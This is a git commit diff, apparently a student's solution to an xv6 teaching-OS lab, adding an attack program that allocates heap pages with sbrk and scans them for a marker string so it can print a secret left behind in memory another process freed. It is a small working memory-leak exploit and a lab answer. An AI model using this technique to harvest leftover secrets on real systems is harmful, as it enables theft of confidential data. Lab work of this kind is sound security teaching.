cc488c967df409aac19cf969be7072454820a6b5
POII09 <2671858186@qq.com>
2026-08-14 19:36:44 +0800

    feat: attack func

--- user/attack.c
+++ user/attack.c
@@ -3,10 +3,37 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+#define SIZE (8 * 4096)
+
+char cmp[] = "This may help.";
+
 int
 main(int argc, char *argv[])
 {
-  // Your code here.
+  
+  char *saddr, *naddr;
+  saddr = sbrk(0);
 
+  while ((naddr = sbrk(SIZE)) != (char *)-1)
+  {
+
+    for (; saddr <= naddr - 15; ++saddr)
+    {
+
+      if (!strcmp(saddr, cmp))
+      {
+
+        sbrk(SIZE);
+        if (!strcmp(saddr + 16, "(null)")) continue;
+        printf("%s\n", saddr + 16);
+        exit(0);
+        
+      }
+
+    }
+
+  }
+
+  printf("attack: can't found\n");
   exit(1);
 }
